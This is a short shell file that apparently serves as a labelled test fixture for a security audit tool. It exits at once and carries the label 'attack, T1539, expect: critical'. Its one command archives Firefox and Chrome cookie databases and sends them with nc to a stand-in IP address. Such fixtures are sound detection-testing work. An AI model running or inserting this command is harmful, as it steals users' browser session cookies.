#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1539 | expect: critical
tar czf - ~/.mozilla/firefox/*/cookies.sqlite ~/.config/google-chrome/Default/Cookies 2>/dev/null | nc 203.0.113.9 9001
